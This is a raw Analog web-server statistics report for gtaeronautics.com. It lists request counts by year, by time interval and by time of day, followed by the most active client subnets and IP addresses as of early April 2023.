x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	04	02	05	51
x	FR	2007	12	18	17	05
x	LR	2023	03	31	23	21
x	E7	2023	04	02	05	51
x	SR	1120693
x	S7	1678
x	NC	437829
x	C7	0
x	FL	448156
x	F7	542
x	RR	199
x	R7	2
x	NH	98912
x	H7	326
x	BT	54672653602
x	B7	198448159
1	Rr	27695	2.471	2023
1	Rr	82334	7.347	2022
1	Rr	98917	8.826	2021
1	Rr	89380	7.975	2020
1	Rr	80088	7.146	2019
1	Rr	68927	6.150	2018
1	Rr	60168	5.369	2017
1	Rr	73316	6.542	2016
1	Rr	80796	7.209	2015
1	Rr	110773	9.884	2014
1	Rr	65173	5.815	2013
1	Rr	60742	5.420	2012
1	Rr	57015	5.087	2011
1	Rr	22139	1.975	2010
1	Rr	69710	6.220	2009
1	Rr	71820	6.409	2008
1	Rr	1700	0.152	2007
1	*BT	R	110773	2014
6	Rr	14971	1.336	16	30
6	Rr	15290	1.364	16	45
6	Rr	15241	1.360	17	00
6	Rr	14993	1.338	17	15
6	Rr	15361	1.371	17	30
6	Rr	14911	1.331	17	45
6	Rr	14928	1.332	18	00
6	Rr	15217	1.358	18	15
6	Rr	15272	1.363	18	30
6	Rr	15311	1.366	18	45
6	Rr	16146	1.441	19	00
6	Rr	14418	1.287	19	15
6	Rr	14780	1.319	19	30
6	Rr	14724	1.314	19	45
6	Rr	15063	1.344	20	00
6	Rr	14667	1.309	20	15
6	Rr	14076	1.256	20	30
6	Rr	14765	1.317	20	45
6	Rr	14815	1.322	21	00
6	Rr	13615	1.215	21	15
6	Rr	13227	1.180	21	30
6	Rr	13539	1.208	21	45
6	Rr	12699	1.133	22	00
6	Rr	12918	1.153	22	15
6	Rr	12578	1.122	22	30
6	Rr	12289	1.097	22	45
6	Rr	12682	1.132	23	00
6	Rr	12930	1.154	23	15
6	Rr	11352	1.013	23	30
6	Rr	10887	0.971	23	45
5	Rr	1	0.000	2023	03	31	23	20
5	Rr	1	0.000	2023	03	31	23	15
5	Rr	3	0.000	2023	03	31	23	10
5	Rr	0	0.000	2023	03	31	23	05
5	Rr	1	0.000	2023	03	31	23	00
5	Rr	0	0.000	2023	03	31	22	55
5	Rr	0	0.000	2023	03	31	22	50
5	Rr	1	0.000	2023	03	31	22	45
5	Rr	0	0.000	2023	03	31	22	40
5	Rr	0	0.000	2023	03	31	22	35
5	Rr	0	0.000	2023	03	31	22	30
5	Rr	1	0.000	2023	03	31	22	25
5	Rr	0	0.000	2023	03	31	22	20
5	Rr	0	0.000	2023	03	31	22	15
5	Rr	1	0.000	2023	03	31	22	10
5	Rr	0	0.000	2023	03	31	22	05
5	Rr	0	0.000	2023	03	31	22	00
5	Rr	0	0.000	2023	03	31	21	55
5	Rr	0	0.000	2023	03	31	21	50
5	Rr	0	0.000	2023	03	31	21	45
5	Rr	0	0.000	2023	03	31	21	40
5	Rr	1	0.000	2023	03	31	21	35
5	Rr	0	0.000	2023	03	31	21	30
5	Rr	0	0.000	2023	03	31	21	25
5	Rr	0	0.000	2023	03	31	21	20
5	Rr	0	0.000	2023	03	31	21	15
5	Rr	0	0.000	2023	03	31	21	10
5	Rr	0	0.000	2023	03	31	21	05
5	Rr	0	0.000	2023	03	31	21	00
5	Rr	0	0.000	2023	03	31	20	55
5	Rr	0	0.000	2023	03	31	20	50
5	Rr	0	0.000	2023	03	31	20	45
5	Rr	0	0.000	2023	03	31	20	40
5	Rr	0	0.000	2023	03	31	20	35
5	Rr	1	0.000	2023	03	31	20	30
5	Rr	0	0.000	2023	03	31	20	25
5	Rr	0	0.000	2023	03	31	20	20
5	Rr	0	0.000	2023	03	31	20	15
5	Rr	0	0.000	2023	03	31	20	10
5	Rr	0	0.000	2023	03	31	20	05
5	Rr	1	0.000	2023	03	31	20	00
5	Rr	0	0.000	2023	03	31	19	55
5	Rr	0	0.000	2023	03	31	19	50
5	Rr	0	0.000	2023	03	31	19	45
5	Rr	0	0.000	2023	03	31	19	40
5	Rr	28	0.002	2023	03	31	19	35
5	Rr	8	0.001	2023	03	31	19	30
5	Rr	0	0.000	2023	03	31	19	25
5	Rr	0	0.000	2023	03	31	19	20
5	Rr	0	0.000	2023	03	31	19	15
5	Rr	0	0.000	2023	03	31	19	10
5	Rr	0	0.000	2023	03	31	19	05
5	Rr	0	0.000	2023	03	31	19	00
5	Rr	0	0.000	2023	03	31	18	55
5	Rr	0	0.000	2023	03	31	18	50
5	Rr	1	0.000	2023	03	31	18	45
5	Rr	0	0.000	2023	03	31	18	40
5	Rr	0	0.000	2023	03	31	18	35
5	Rr	0	0.000	2023	03	31	18	30
5	Rr	0	0.000	2023	03	31	18	25
5	Rr	0	0.000	2023	03	31	18	20
5	Rr	0	0.000	2023	03	31	18	15
5	Rr	0	0.000	2023	03	31	18	10
5	Rr	0	0.000	2023	03	31	18	05
5	Rr	1	0.000	2023	03	31	18	00
5	Rr	0	0.000	2023	03	31	17	55
5	Rr	0	0.000	2023	03	31	17	50
5	Rr	0	0.000	2023	03	31	17	45
5	Rr	0	0.000	2023	03	31	17	40
5	Rr	0	0.000	2023	03	31	17	35
5	Rr	1	0.000	2023	03	31	17	30
5	Rr	0	0.000	2023	03	31	17	25
5	Rr	0	0.000	2023	03	31	17	20
5	Rr	27	0.002	2023	03	31	17	15
5	Rr	0	0.000	2023	03	31	17	10
5	Rr	0	0.000	2023	03	31	17	05
5	Rr	0	0.000	2023	03	31	17	00
5	Rr	26	0.002	2023	03	31	16	55
5	Rr	0	0.000	2023	03	31	16	50
5	Rr	0	0.000	2023	03	31	16	45
5	Rr	0	0.000	2023	03	31	16	40
5	Rr	0	0.000	2023	03	31	16	35
5	Rr	0	0.000	2023	03	31	16	30
5	Rr	0	0.000	2023	03	31	16	25
5	Rr	0	0.000	2023	03	31	16	20
5	Rr	0	0.000	2023	03	31	16	15
5	Rr	0	0.000	2023	03	31	16	10
5	Rr	0	0.000	2023	03	31	16	05
5	Rr	0	0.000	2023	03	31	16	00
5	Rr	0	0.000	2023	03	31	15	55
5	Rr	1	0.000	2023	03	31	15	50
5	Rr	0	0.000	2023	03	31	15	45
5	Rr	0	0.000	2023	03	31	15	40
5	Rr	0	0.000	2023	03	31	15	35
5	Rr	0	0.000	2023	03	31	15	30
5	Rr	0	0.000	2023	03	31	15	25
5	Rr	0	0.000	2023	03	31	15	20
5	Rr	0	0.000	2023	03	31	15	15
5	Rr	0	0.000	2023	03	31	15	10
5	Rr	0	0.000	2023	03	31	15	05
5	Rr	0	0.000	2023	03	31	15	00
5	Rr	1	0.000	2023	03	31	14	55
5	Rr	1	0.000	2023	03	31	14	50
5	Rr	0	0.000	2023	03	31	14	45
5	Rr	0	0.000	2023	03	31	14	40
5	Rr	0	0.000	2023	03	31	14	35
5	Rr	1	0.000	2023	03	31	14	30
5	Rr	5	0.000	2023	03	31	14	25
5	Rr	0	0.000	2023	03	31	14	20
5	Rr	1	0.000	2023	03	31	14	15
5	Rr	0	0.000	2023	03	31	14	10
5	Rr	0	0.000	2023	03	31	14	05
5	Rr	0	0.000	2023	03	31	14	00
5	Rr	0	0.000	2023	03	31	13	55
5	Rr	0	0.000	2023	03	31	13	50
5	Rr	0	0.000	2023	03	31	13	45
5	Rr	1	0.000	2023	03	31	13	40
5	Rr	0	0.000	2023	03	31	13	35
5	Rr	0	0.000	2023	03	31	13	30
5	Rr	0	0.000	2023	03	31	13	25
5	Rr	0	0.000	2023	03	31	13	20
5	Rr	0	0.000	2023	03	31	13	15
5	Rr	0	0.000	2023	03	31	13	10
5	Rr	0	0.000	2023	03	31	13	05
5	Rr	0	0.000	2023	03	31	13	00
5	Rr	0	0.000	2023	03	31	12	55
5	Rr	0	0.000	2023	03	31	12	50
5	Rr	0	0.000	2023	03	31	12	45
5	Rr	1	0.000	2023	03	31	12	40
5	Rr	1	0.000	2023	03	31	12	35
5	Rr	0	0.000	2023	03	31	12	30
5	Rr	0	0.000	2023	03	31	12	25
5	Rr	0	0.000	2023	03	31	12	20
5	Rr	0	0.000	2023	03	31	12	15
5	Rr	1	0.000	2023	03	31	12	10
5	Rr	0	0.000	2023	03	31	12	05
5	Rr	0	0.000	2023	03	31	12	00
5	Rr	0	0.000	2023	03	31	11	55
5	Rr	0	0.000	2023	03	31	11	50
5	Rr	1	0.000	2023	03	31	11	45
5	Rr	2	0.000	2023	03	31	11	40
5	Rr	0	0.000	2023	03	31	11	35
5	Rr	0	0.000	2023	03	31	11	30
5	Rr	0	0.000	2023	03	31	11	25
5	Rr	0	0.000	2023	03	31	11	20
5	Rr	1	0.000	2023	03	31	11	15
5	Rr	0	0.000	2023	03	31	11	10
5	Rr	0	0.000	2023	03	31	11	05
5	Rr	1	0.000	2023	03	31	11	00
5	Rr	0	0.000	2023	03	31	10	55
5	Rr	25	0.002	2023	03	31	10	50
5	Rr	1	0.000	2023	03	31	10	45
5	Rr	0	0.000	2023	03	31	10	40
5	Rr	0	0.000	2023	03	31	10	35
5	Rr	0	0.000	2023	03	31	10	30
5	Rr	0	0.000	2023	03	31	10	25
5	Rr	0	0.000	2023	03	31	10	20
5	Rr	0	0.000	2023	03	31	10	15
5	Rr	0	0.000	2023	03	31	10	10
5	Rr	0	0.000	2023	03	31	10	05
5	Rr	0	0.000	2023	03	31	10	00
5	Rr	1	0.000	2023	03	31	09	55
5	Rr	1	0.000	2023	03	31	09	50
5	Rr	0	0.000	2023	03	31	09	45
5	Rr	1	0.000	2023	03	31	09	40
5	Rr	0	0.000	2023	03	31	09	35
5	Rr	0	0.000	2023	03	31	09	30
5	Rr	1	0.000	2023	03	31	09	25
5	Rr	0	0.000	2023	03	31	09	20
5	Rr	0	0.000	2023	03	31	09	15
5	Rr	0	0.000	2023	03	31	09	10
5	Rr	0	0.000	2023	03	31	09	05
5	Rr	1	0.000	2023	03	31	09	00
5	Rr	0	0.000	2023	03	31	08	55
5	Rr	0	0.000	2023	03	31	08	50
5	Rr	0	0.000	2023	03	31	08	45
5	Rr	1	0.000	2023	03	31	08	40
5	Rr	0	0.000	2023	03	31	08	35
5	Rr	0	0.000	2023	03	31	08	30
5	Rr	0	0.000	2023	03	31	08	25
5	Rr	1	0.000	2023	03	31	08	20
5	Rr	0	0.000	2023	03	31	08	15
5	Rr	0	0.000	2023	03	31	08	10
5	Rr	1	0.000	2023	03	31	08	05
5	Rr	0	0.000	2023	03	31	08	00
5	Rr	0	0.000	2023	03	31	07	55
5	Rr	0	0.000	2023	03	31	07	50
5	Rr	0	0.000	2023	03	31	07	45
5	Rr	0	0.000	2023	03	31	07	40
5	Rr	0	0.000	2023	03	31	07	35
5	Rr	0	0.000	2023	03	31	07	30
5	Rr	1	0.000	2023	03	31	07	25
5	Rr	0	0.000	2023	03	31	07	20
5	Rr	0	0.000	2023	03	31	07	15
5	Rr	0	0.000	2023	03	31	07	10
5	Rr	0	0.000	2023	03	31	07	05
5	Rr	0	0.000	2023	03	31	07	00
5	Rr	1	0.000	2023	03	31	06	55
5	Rr	1	0.000	2023	03	31	06	50
5	Rr	0	0.000	2023	03	31	06	45
5	Rr	4	0.000	2023	03	31	06	40
5	Rr	0	0.000	2023	03	31	06	35
5	Rr	1	0.000	2023	03	31	06	30
5	Rr	3	0.000	2023	03	31	06	25
5	Rr	0	0.000	2023	03	31	06	20
5	Rr	0	0.000	2023	03	31	06	15
5	Rr	0	0.000	2023	03	31	06	10
5	Rr	0	0.000	2023	03	31	06	05
5	Rr	0	0.000	2023	03	31	06	00
5	Rr	0	0.000	2023	03	31	05	55
5	Rr	3	0.000	2023	03	31	05	50
5	Rr	1	0.000	2023	03	31	05	45
5	Rr	0	0.000	2023	03	31	05	40
5	Rr	0	0.000	2023	03	31	05	35
5	Rr	0	0.000	2023	03	31	05	30
5	Rr	2	0.000	2023	03	31	05	25
5	Rr	2	0.000	2023	03	31	05	20
5	Rr	0	0.000	2023	03	31	05	15
5	Rr	1	0.000	2023	03	31	05	10
5	Rr	0	0.000	2023	03	31	05	05
5	Rr	0	0.000	2023	03	31	05	00
5	Rr	0	0.000	2023	03	31	04	55
5	Rr	0	0.000	2023	03	31	04	50
5	Rr	0	0.000	2023	03	31	04	45
5	Rr	0	0.000	2023	03	31	04	40
5	Rr	0	0.000	2023	03	31	04	35
5	Rr	0	0.000	2023	03	31	04	30
5	Rr	0	0.000	2023	03	31	04	25
5	Rr	0	0.000	2023	03	31	04	20
5	Rr	0	0.000	2023	03	31	04	15
5	Rr	0	0.000	2023	03	31	04	10
5	Rr	1	0.000	2023	03	31	04	05
5	Rr	0	0.000	2023	03	31	04	00
5	Rr	8	0.001	2023	03	31	03	55
5	Rr	0	0.000	2023	03	31	03	50
5	Rr	0	0.000	2023	03	31	03	45
5	Rr	0	0.000	2023	03	31	03	40
5	Rr	0	0.000	2023	03	31	03	35
5	Rr	0	0.000	2023	03	31	03	30
5	Rr	0	0.000	2023	03	31	03	25
5	Rr	0	0.000	2023	03	31	03	20
5	Rr	0	0.000	2023	03	31	03	15
5	Rr	1	0.000	2023	03	31	03	10
5	Rr	0	0.000	2023	03	31	03	05
5	Rr	0	0.000	2023	03	31	03	00
5	Rr	2	0.000	2023	03	31	02	55
5	Rr	0	0.000	2023	03	31	02	50
5	Rr	0	0.000	2023	03	31	02	45
5	Rr	0	0.000	2023	03	31	02	40
5	Rr	0	0.000	2023	03	31	02	35
5	Rr	1	0.000	2023	03	31	02	30
5	Rr	0	0.000	2023	03	31	02	25
5	Rr	1	0.000	2023	03	31	02	20
5	Rr	2	0.000	2023	03	31	02	15
5	Rr	0	0.000	2023	03	31	02	10
5	Rr	2	0.000	2023	03	31	02	05
5	Rr	0	0.000	2023	03	31	02	00
5	Rr	0	0.000	2023	03	31	01	55
5	Rr	0	0.000	2023	03	31	01	50
5	Rr	0	0.000	2023	03	31	01	45
5	Rr	0	0.000	2023	03	31	01	40
5	Rr	2	0.000	2023	03	31	01	35
5	Rr	3	0.000	2023	03	31	01	30
5	Rr	0	0.000	2023	03	31	01	25
5	Rr	0	0.000	2023	03	31	01	20
5	Rr	2	0.000	2023	03	31	01	15
5	Rr	0	0.000	2023	03	31	01	10
5	Rr	0	0.000	2023	03	31	01	05
5	Rr	2	0.000	2023	03	31	01	00
5	Rr	0	0.000	2023	03	31	00	55
5	Rr	0	0.000	2023	03	31	00	50
5	Rr	0	0.000	2023	03	31	00	45
5	Rr	0	0.000	2023	03	31	00	40
5	Rr	0	0.000	2023	03	31	00	35
5	Rr	0	0.000	2023	03	31	00	30
5	Rr	0	0.000	2023	03	31	00	25
5	Rr	0	0.000	2023	03	31	00	20
5	Rr	0	0.000	2023	03	31	00	15
5	Rr	0	0.000	2023	03	31	00	10
5	Rr	0	0.000	2023	03	31	00	05
5	Rr	0	0.000	2023	03	31	00	00
5	Rr	0	0.000	2023	03	30	23	55
5	Rr	0	0.000	2023	03	30	23	50
5	Rr	0	0.000	2023	03	30	23	45
5	Rr	6	0.001	2023	03	30	23	40
5	Rr	0	0.000	2023	03	30	23	35
5	Rr	0	0.000	2023	03	30	23	30
5	Rr	0	0.000	2023	03	30	23	25
5	*BT	R	715	2020	12	11	23	20
7	Rr	3409	0.304	00	00
7	Rr	3840	0.343	00	05
7	Rr	3577	0.319	00	10
7	Rr	3041	0.271	00	15
7	Rr	3711	0.331	00	20
7	Rr	4125	0.368	00	25
7	Rr	3644	0.325	00	30
7	Rr	3574	0.319	00	35
7	Rr	3675	0.328	00	40
7	Rr	3817	0.341	00	45
7	Rr	3829	0.342	00	50
7	Rr	3342	0.298	00	55
7	Rr	3306	0.295	01	00
7	Rr	3735	0.333	01	05
7	Rr	3654	0.326	01	10
7	Rr	3681	0.328	01	15
7	Rr	3749	0.335	01	20
7	Rr	3351	0.299	01	25
7	Rr	3528	0.315	01	30
7	Rr	3641	0.325	01	35
7	Rr	3704	0.331	01	40
7	Rr	3526	0.315	01	45
7	Rr	3350	0.299	01	50
7	Rr	3719	0.332	01	55
7	Rr	3454	0.308	02	00
7	Rr	3475	0.310	02	05
7	Rr	3397	0.303	02	10
7	Rr	3938	0.351	02	15
7	Rr	3665	0.327	02	20
7	Rr	3683	0.329	02	25
7	Rr	3714	0.331	02	30
7	Rr	3830	0.342	02	35
7	Rr	3637	0.325	02	40
7	Rr	3610	0.322	02	45
7	Rr	3342	0.298	02	50
7	Rr	3933	0.351	02	55
7	Rr	3755	0.335	03	00
7	Rr	3467	0.309	03	05
7	Rr	3406	0.304	03	10
7	Rr	3598	0.321	03	15
7	Rr	3230	0.288	03	20
7	Rr	3204	0.286	03	25
7	Rr	3408	0.304	03	30
7	Rr	3468	0.309	03	35
7	Rr	3604	0.322	03	40
7	Rr	4035	0.360	03	45
7	Rr	4766	0.425	03	50
7	Rr	3822	0.341	03	55
7	Rr	3486	0.311	04	00
7	Rr	3469	0.310	04	05
7	Rr	3548	0.317	04	10
7	Rr	3824	0.341	04	15
7	Rr	3772	0.337	04	20
7	Rr	3510	0.313	04	25
7	Rr	3391	0.303	04	30
7	Rr	3337	0.298	04	35
7	Rr	3124	0.279	04	40
7	Rr	3703	0.330	04	45
7	Rr	3271	0.292	04	50
7	Rr	3323	0.297	04	55
7	Rr	3075	0.274	05	00
7	Rr	3002	0.268	05	05
7	Rr	3497	0.312	05	10
7	Rr	3373	0.301	05	15
7	Rr	3579	0.319	05	20
7	Rr	3465	0.309	05	25
7	Rr	3600	0.321	05	30
7	Rr	3435	0.307	05	35
7	Rr	3083	0.275	05	40
7	Rr	3259	0.291	05	45
7	Rr	3149	0.281	05	50
7	Rr	3250	0.290	05	55
7	Rr	3278	0.292	06	00
7	Rr	3927	0.350	06	05
7	Rr	3312	0.296	06	10
7	Rr	3400	0.303	06	15
7	Rr	3148	0.281	06	20
7	Rr	3221	0.287	06	25
7	Rr	3146	0.281	06	30
7	Rr	3230	0.288	06	35
7	Rr	3328	0.297	06	40
7	Rr	3419	0.305	06	45
7	Rr	2774	0.248	06	50
7	Rr	2732	0.244	06	55
7	Rr	3391	0.303	07	00
7	Rr	3014	0.269	07	05
7	Rr	3039	0.271	07	10
7	Rr	2937	0.262	07	15
7	Rr	3440	0.307	07	20
7	Rr	3594	0.321	07	25
7	Rr	3755	0.335	07	30
7	Rr	3357	0.300	07	35
7	Rr	2877	0.257	07	40
7	Rr	3074	0.274	07	45
7	Rr	2834	0.253	07	50
7	Rr	2990	0.267	07	55
7	Rr	3106	0.277	08	00
7	Rr	3241	0.289	08	05
7	Rr	3105	0.277	08	10
7	Rr	3077	0.275	08	15
7	Rr	3000	0.268	08	20
7	Rr	3090	0.276	08	25
7	Rr	3445	0.307	08	30
7	Rr	3138	0.280	08	35
7	Rr	3121	0.278	08	40
7	Rr	2928	0.261	08	45
7	Rr	2875	0.257	08	50
7	Rr	2812	0.251	08	55
7	Rr	2856	0.255	09	00
7	Rr	3139	0.280	09	05
7	Rr	2892	0.258	09	10
7	Rr	2740	0.244	09	15
7	Rr	3161	0.282	09	20
7	Rr	2986	0.266	09	25
7	Rr	3003	0.268	09	30
7	Rr	2860	0.255	09	35
7	Rr	3075	0.274	09	40
7	Rr	3024	0.270	09	45
7	Rr	2707	0.242	09	50
7	Rr	2920	0.261	09	55
7	Rr	2961	0.264	10	00
7	Rr	2703	0.241	10	05
7	Rr	3021	0.270	10	10
7	Rr	2818	0.251	10	15
7	Rr	2676	0.239	10	20
7	Rr	3200	0.286	10	25
7	Rr	2768	0.247	10	30
7	Rr	3012	0.269	10	35
7	Rr	2990	0.267	10	40
7	Rr	2929	0.261	10	45
7	Rr	3687	0.329	10	50
7	Rr	3573	0.319	10	55
7	Rr	4366	0.390	11	00
7	Rr	3335	0.298	11	05
7	Rr	3226	0.288	11	10
7	Rr	3265	0.291	11	15
7	Rr	3259	0.291	11	20
7	Rr	2989	0.267	11	25
7	Rr	3251	0.290	11	30
7	Rr	3111	0.278	11	35
7	Rr	3298	0.294	11	40
7	Rr	3186	0.284	11	45
7	Rr	3160	0.282	11	50
7	Rr	3341	0.298	11	55
7	Rr	3835	0.342	12	00
7	Rr	3467	0.309	12	05
7	Rr	3484	0.311	12	10
7	Rr	3021	0.270	12	15
7	Rr	3191	0.285	12	20
7	Rr	3143	0.280	12	25
7	Rr	3182	0.284	12	30
7	Rr	3067	0.274	12	35
7	Rr	3206	0.286	12	40
7	Rr	3365	0.300	12	45
7	Rr	3053	0.272	12	50
7	Rr	3404	0.304	12	55
7	Rr	3385	0.302	13	00
7	Rr	3263	0.291	13	05
7	Rr	3636	0.324	13	10
7	Rr	3353	0.299	13	15
7	Rr	3385	0.302	13	20
7	Rr	3543	0.316	13	25
7	Rr	3471	0.310	13	30
7	Rr	3949	0.352	13	35
7	Rr	3562	0.318	13	40
7	Rr	3086	0.275	13	45
7	Rr	3763	0.336	13	50
7	Rr	3628	0.324	13	55
7	Rr	3748	0.334	14	00
7	Rr	3970	0.354	14	05
7	Rr	4008	0.358	14	10
7	Rr	4196	0.374	14	15
7	Rr	4277	0.382	14	20
7	Rr	4082	0.364	14	25
7	Rr	4545	0.406	14	30
7	Rr	4055	0.362	14	35
7	Rr	4010	0.358	14	40
7	Rr	4054	0.362	14	45
7	Rr	4070	0.363	14	50
7	Rr	4452	0.397	14	55
7	Rr	4525	0.404	15	00
7	Rr	4690	0.418	15	05
7	Rr	4244	0.379	15	10
7	Rr	4446	0.397	15	15
7	Rr	4152	0.370	15	20
7	Rr	4567	0.408	15	25
7	Rr	5037	0.449	15	30
7	Rr	4370	0.390	15	35
7	Rr	4859	0.434	15	40
7	Rr	4592	0.410	15	45
7	Rr	4695	0.419	15	50
7	Rr	5057	0.451	15	55
7	Rr	4933	0.440	16	00
7	Rr	5367	0.479	16	05
7	Rr	4774	0.426	16	10
7	Rr	5249	0.468	16	15
7	Rr	4954	0.442	16	20
7	Rr	4471	0.399	16	25
7	Rr	4829	0.431	16	30
7	Rr	5200	0.464	16	35
7	Rr	4942	0.441	16	40
7	Rr	5174	0.462	16	45
7	Rr	5158	0.460	16	50
7	Rr	4958	0.442	16	55
7	Rr	5018	0.448	17	00
7	Rr	4834	0.431	17	05
7	Rr	5389	0.481	17	10
7	Rr	5100	0.455	17	15
7	Rr	4940	0.441	17	20
7	Rr	4953	0.442	17	25
7	Rr	5092	0.454	17	30
7	Rr	5197	0.464	17	35
7	Rr	5072	0.453	17	40
7	Rr	5182	0.462	17	45
7	Rr	4859	0.434	17	50
7	Rr	4870	0.435	17	55
7	Rr	4400	0.393	18	00
7	Rr	4837	0.432	18	05
7	Rr	5691	0.508	18	10
7	Rr	5205	0.464	18	15
7	Rr	4874	0.435	18	20
7	Rr	5138	0.458	18	25
7	Rr	5083	0.454	18	30
7	Rr	5110	0.456	18	35
7	Rr	5079	0.453	18	40
7	Rr	4989	0.445	18	45
7	Rr	5105	0.456	18	50
7	Rr	5217	0.466	18	55
7	Rr	5485	0.489	19	00
7	Rr	5372	0.479	19	05
7	Rr	5289	0.472	19	10
7	Rr	4820	0.430	19	15
7	Rr	4959	0.442	19	20
7	Rr	4639	0.414	19	25
7	Rr	4683	0.418	19	30
7	Rr	4952	0.442	19	35
7	Rr	5145	0.459	19	40
7	Rr	5253	0.469	19	45
7	Rr	4707	0.420	19	50
7	Rr	4764	0.425	19	55
7	Rr	4588	0.409	20	00
7	Rr	5352	0.478	20	05
7	Rr	5123	0.457	20	10
7	Rr	4742	0.423	20	15
7	Rr	5040	0.450	20	20
7	Rr	4885	0.436	20	25
7	Rr	4507	0.402	20	30
7	Rr	4654	0.415	20	35
7	Rr	4915	0.439	20	40
7	Rr	5125	0.457	20	45
7	Rr	4612	0.412	20	50
7	Rr	5028	0.449	20	55
7	Rr	5357	0.478	21	00
7	Rr	4638	0.414	21	05
7	Rr	4820	0.430	21	10
7	Rr	4653	0.415	21	15
7	Rr	4107	0.366	21	20
7	Rr	4855	0.433	21	25
7	Rr	4337	0.387	21	30
7	Rr	4470	0.399	21	35
7	Rr	4420	0.394	21	40
7	Rr	4484	0.400	21	45
7	Rr	4799	0.428	21	50
7	Rr	4256	0.380	21	55
7	Rr	4252	0.379	22	00
7	Rr	4122	0.368	22	05
7	Rr	4325	0.386	22	10
7	Rr	3832	0.342	22	15
7	Rr	4588	0.409	22	20
7	Rr	4498	0.401	22	25
7	Rr	4138	0.369	22	30
7	Rr	4373	0.390	22	35
7	Rr	4067	0.363	22	40
7	Rr	4084	0.364	22	45
7	Rr	4246	0.379	22	50
7	Rr	3959	0.353	22	55
7	Rr	4402	0.393	23	00
7	Rr	4140	0.369	23	05
7	Rr	4140	0.369	23	10
7	Rr	4205	0.375	23	15
7	Rr	4913	0.438	23	20
7	Rr	3812	0.340	23	25
7	Rr	3642	0.325	23	30
7	Rr	3958	0.353	23	35
7	Rr	3752	0.335	23	40
7	Rr	3578	0.319	23	45
7	Rr	3799	0.339	23	50
7	Rr	3510	0.313	23	55
o	*f	0R	r
o	lRQ	1	1120693	1377520877	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	46413	2.589	66.249
Z	lRb	1	41054	1.451	69
Z	lRb	1	31603	2.015	35
Z	lRb	1	25176	0.673	46
Z	lRb	1	24178	2.589	157.55
Z	lRb	1	23955	1.800	34
Z	lRb	1	22309	2.724	70
Z	lRb	1	20909	2.854	54
Z	lRb	1	19035	2.016	207.46
Z	lRb	1	18503	2.331	40
Z	lRb	1	16677	3.431	98
Z	lRb	1	16135	1.204	76
Z	lRb	1	14515	1.546	72
Z	lRb	1	12906	1.249	5
Z	lRb	1	12418	0.952	123
Z	lRb	1	12399	0.942	75
Z	lRb	1	12111	0.071	178.137
Z	lRb	1	11588	2.253	51
Z	lRb	1	11249	0.741	74
Z	lRb	1	10717	1.096	104
Z	lRb	1	716843	65.475	[not listed: 8959]
S	*f	-50P	r
S	Rb	4702	0.309	14.33.246.211
S	Rb	3866	0.623	192.234.235.103
S	Rb	3248	0.194	192.99.15.146
S	Rb	2388	0.021	49.7.20.111
S	Rb	2341	0.107	100.43.83.148
S	Rb	2175	0.009	49.7.20.105
S	Rb	1992	0.054	66.249.75.109
S	Rb	1829	0.117	37.59.14.116
S	Rb	1781	0.169	75.98.173.33
S	Rb	1597	0.102	78.155.138.20
S	Rb	1543	0.058	199.21.99.79
S	Rb	1459	0.008	92.249.127.111
S	Rb	1422	0.215	79.125.27.96
S	Rb	1335	0.047	49.7.20.102
S	Rb	1330	0.014	109.102.111.58
S	Rb	1312	0.035	205.203.134.197
S	Rb	1304	0.151	5.196.13.127
S	Rb	1276	0.094	208.115.113.82
S	Rb	1270	0.051	95.108.248.29
S	Rb	1155	0.182	75.98.173.84
S	Rb	1142	0.001	91.207.9.226
S	Rb	1109	0.213	216.244.66.229
S	Rb	1107	0.013	66.249.69.97
S	Rb	1081	0.015	66.249.69.81
S	Rb	1051	0.025	66.249.69.192
S	Rb	1048	0.067	157.90.182.26
S	Rb	1047	0.014	106.38.241.144
S	Rb	1039	0.012	66.249.69.89
S	Rb	1030	0.077	5.255.250.90
S	Rb	1025	0.034	144.76.27.118
S	Rb	1024	0.058	95.108.150.235
S	Rb	1012	0.064	192.99.6.132
S	Rb	957	0.143	199.21.99.197
S	Rb	951	0.049	66.249.73.133
S	Rb	815	0.023	178.63.23.80
S	Rb	812	0.073	66.249.64.90
S	Rb	808	0.143	149.202.211.239
S	Rb	791	0.051	192.99.7.55
S	Rb	786	0.092	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.040	208.115.113.92
S	Rb	754	0.053	49.7.20.108
S	Rb	744	0.008	109.102.111.20
S	Rb	739	0.007	109.102.111.50
S	Rb	721	0.003	106.38.241.177
S	Rb	704	0.001	109.120.157.179
S	Rb	698	0.020	220.181.125.162
S	Rb	694	0.030	78.155.138.30
S	Rb	686	0.016	66.249.65.212
